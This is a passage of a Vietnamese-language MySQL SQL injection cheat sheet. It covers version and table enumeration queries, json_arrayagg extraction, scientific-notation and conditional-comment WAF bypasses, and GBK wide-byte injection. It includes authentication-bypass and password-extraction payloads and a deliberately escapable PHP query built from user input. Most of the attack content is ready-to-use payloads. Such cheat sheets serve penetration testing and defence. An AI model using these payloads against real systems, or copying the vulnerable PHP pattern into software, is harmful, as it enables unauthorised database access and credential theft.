SELECT * FROM mysql.innodb_table_stats;
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
| database_name  | table_name            | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
| dvwa           | guestbook             | 2017-01-19 21:02:57 |      0 |                    1 |                        0 |
| dvwa           | users                 | 2017-01-19 21:03:07 |      5 |                    1 |                        0 |
...
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+

mysql> SHOW TABLES IN dvwa;
+----------------+
| Tables_in_dvwa |
+----------------+
| guestbook      |
| users          |
+----------------+
```

### Phương án thay thế cho VERSION

```sql
mysql> SELECT @@innodb_version;
+------------------+
| @@innodb_version |
+------------------+
| 5.6.31           |
+------------------+

mysql> SELECT @@version;
+-------------------------+
| @@version               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+

mysql> SELECT version();
+-------------------------+
| version()               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+

mysql> SELECT @@GLOBAL.VERSION;
+------------------+
| @@GLOBAL.VERSION |
+------------------+
| 8.0.27           |
+------------------+
```

### Phương án thay thế cho GROUP_CONCAT

Yêu cầu: `MySQL >= 5.7.22`

Dùng `json_arrayagg()` thay cho `group_concat()`, cho phép hiển thị nhiều ký tự hơn

* `group_concat()` = 1024 ký tự
* `json_arrayagg()` > 16.000.000 ký tự

```sql
SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;
```

### Ký hiệu khoa học (Scientific Notation)

Trong MySQL, ký hiệu e được dùng để biểu diễn số theo ký hiệu khoa học. Đây là cách thể hiện các số rất lớn hoặc rất nhỏ theo định dạng ngắn gọn. Ký hiệu e bao gồm một số theo sau bởi chữ e và một số mũ.
Định dạng là: `cơ số 'e' số mũ`.

Ví dụ:

* `1e3` đại diện cho `1 x 10^3` tức là `1000`.
* `1.5e3` đại diện cho `1.5 x 10^3` tức là `1500`.
* `2e-3` đại diện cho `2 x 10^-3` tức là `0.002`.

Các câu truy vấn sau đây là tương đương nhau:

* `SELECT table_name FROM information_schema 1.e.tables`
* `SELECT table_name FROM information_schema .tables`

Tương tự, payload phổ biến để vượt qua xác thực `' or ''='` tương đương với `' or 1.e('')='` và `1' or 1.e(1) or '1'='1`.
Kỹ thuật này có thể được dùng để làm rối câu truy vấn nhằm vượt qua WAF, ví dụ: `1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2`

### Chú thích có điều kiện

Chú thích có điều kiện trong MySQL được đặt trong `/*! ... */` và có thể bao gồm một số phiên bản để chỉ định phiên bản MySQL tối thiểu cần thiết để thực thi đoạn mã bên trong.
Mã bên trong chú thích này chỉ được thực thi nếu phiên bản MySQL lớn hơn hoặc bằng số ngay sau `/*!`. Nếu phiên bản MySQL nhỏ hơn số được chỉ định, mã bên trong chú thích sẽ bị bỏ qua.

* `/*!12345UNION*/`: Điều này có nghĩa là từ UNION sẽ được thực thi như một phần của câu lệnh SQL nếu phiên bản MySQL là 12.345 trở lên.
* `/*!31337SELECT*/`: Tương tự, từ SELECT sẽ được thực thi nếu phiên bản MySQL là 31.337 trở lên.

**Ví dụ**: `/*!12345UNION*/`, `/*!31337SELECT*/`

### Chèn ký tự đa byte (GBK)

Chèn ký tự đa byte (Wide byte injection) là một loại tấn công SQL injection cụ thể nhắm vào các ứng dụng sử dụng bộ ký tự đa byte, như GBK hoặc SJIS. Thuật ngữ "wide byte" đề cập đến các bảng mã ký tự trong đó một ký tự có thể được biểu diễn bởi nhiều hơn một byte. Loại chèn này đặc biệt quan trọng khi ứng dụng và cơ sở dữ liệu diễn giải các chuỗi đa byte khác nhau.

Câu truy vấn `SET NAMES gbk` có thể bị khai thác trong một cuộc tấn công SQL injection dựa trên bảng mã. Khi bộ ký tự được đặt thành GBK, một số ký tự đa byte nhất định có thể được dùng để vượt qua cơ chế escape và chèn mã SQL độc hại.

Một số ký tự có thể được dùng để kích hoạt việc chèn injection.

* `%bf%27`: Đây là biểu diễn URL-encoded của chuỗi byte `0xbf27`. Trong bộ ký tự GBK, `0xbf27` được giải mã thành một ký tự đa byte hợp lệ theo sau bởi một dấu nháy đơn ('). Khi MySQL gặp chuỗi này, nó sẽ diễn giải thành một ký tự GBK hợp lệ duy nhất theo sau bởi một dấu nháy đơn, từ đó kết thúc chuỗi.
* `%bf%5c`: Đại diện cho chuỗi byte `0xbf5c`. Trong GBK, chuỗi này được giải mã thành một ký tự đa byte hợp lệ theo sau bởi một dấu gạch chéo ngược (`\`). Điều này có thể được dùng để escape ký tự tiếp theo trong chuỗi.
* `%a1%27`: Đại diện cho chuỗi byte `0xa127`. Trong GBK, chuỗi này được giải mã thành một ký tự đa byte hợp lệ theo sau bởi một dấu nháy đơn (`'`).

Rất nhiều payload có thể được tạo ra như:

```sql
%A8%27 OR 1=1;--
%8C%A8%27 OR 1=1--
%bf' OR 1=1 -- --
```

Đây là một ví dụ PHP sử dụng bảng mã GBK và lọc dữ liệu đầu vào của người dùng để escape dấu gạch chéo ngược, dấu nháy đơn và dấu nháy kép.

```php
function check_addslashes($string)
{
    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);          //escape any backslash
    $string = preg_replace('/\'/i', '\\\'', $string);                               //escape single quote with a backslash
    $string = preg_replace('/\"/', "\\\"", $string);                                //escape double quote with a backslash
      
    return $string;
}

$id=check_addslashes($_GET['id']);
mysql_query("SET NAMES gbk");
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
print_r(mysql_error());
```

Dưới đây là cách kỹ thuật chèn ký tự đa byte hoạt động:

Ví dụ, nếu dữ liệu đầu vào là `?id=1'`, PHP sẽ thêm một dấu gạch chéo ngược, tạo ra câu truy vấn SQL: `SELECT * FROM users WHERE id='1\'' LIMIT 0,1`.

Tuy nhiên, khi chuỗi `%df` được đưa vào trước dấu nháy đơn, như trong `?id=1%df'`, PHP vẫn thêm dấu gạch chéo ngược. Điều này tạo ra câu truy vấn SQL: `SELECT * FROM users WHERE id='1%df\'' LIMIT 0,1`.

Trong bộ ký tự GBK, chuỗi `%df%5c` được dịch thành ký tự `連`. Vì vậy, câu truy vấn SQL trở thành: `SELECT * FROM users WHERE id='1連'' LIMIT 0,1`. Ở đây, ký tự đa byte `連` đã "ăn" mất ký tự escape được thêm vào, cho phép thực hiện SQL injection.

Do đó, bằng cách sử dụng payload `?id=1%df' and 1=1 --+`, sau khi PHP thêm dấu gạch chéo ngược, câu truy vấn SQL sẽ chuyển thành: `SELECT * FROM users WHERE id='1連' and 1=1 --+' LIMIT 0,1`. Câu truy vấn đã bị thay đổi này có thể được chèn thành công, vượt qua logic SQL dự kiến ban đầu.

## Tài liệu tham khảo

* [[SQLi] Extracting data without knowing columns names - Ahmed Sultan - February 9, 2019](https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/)
* [A Scientific Notation Bug in MySQL left AWS WAF Clients Vulnerable to SQL Injection - Marc Olivier Bergeron - October 19, 2021](https://web.archive.org/web/20211019152624/https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/)
* [Alternative for Information_Schema.Tables in MySQL - Osanda Malith Jayathissa - February 3, 2017](https://web.archive.org/web/20260227032450/https://osandamalith.com/2017/02/03/alternative-for-information_schema-tables-in-mysql/)
* [Ekoparty CTF 2016 (Web 100) - p4-team - October 26, 2016](https://github.com/p4-team/ctf/tree/master/2016-10-26-ekoparty/web_100)
* [Error Based Injection | NetSPI SQL Injection Wiki - NetSPI - February 15, 2021](https://web.archive.org/web/20210215172533/https://sqlwiki.netspi.com/injectionTypes/errorBased/)
* [How to Use SQL Calls to Secure Your Web Site - IPA ISEC - January 18, 2024](https://web.archive.org/web/20240118024024/https://www.ipa.go.jp/security/vuln/ps6vr70000011hc4-att/000017321.pdf)
* [MySQL Out of Band Hacking - Osanda Malith Jayathissa - February 23, 2018](https://web.archive.org/web/20260303030701/https://www.exploit-db.com/docs/english/41273-mysql-out-of-band-hacking.pdf)
* [SQL injection - The oldschool way - 02 - Ahmed Sultan - January 1, 2025](https://web.archive.org/web/20250807062504/https://www.youtube.com/watch?si=kFQkvCEn2NiWLDGY&v=u91EdO1cDak&feature=youtu.be)
* [SQL Truncation Attack - Rohit Shaw - June 29, 2014](https://web.archive.org/web/20201001181524/https://resources.infosecinstitute.com/sql-truncation-attack/)
* [SQLi filter evasion cheat sheet (MySQL) - Johannes Dahse - December 4, 2010](https://web.archive.org/web/20101209155346/http://websec.wordpress.com:80/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql)
* [The SQL Injection Knowledge Base - Roberto Salgado - May 29, 2013](https://websec.ca/kb/sql_injection#MySQL_Default_Databases)
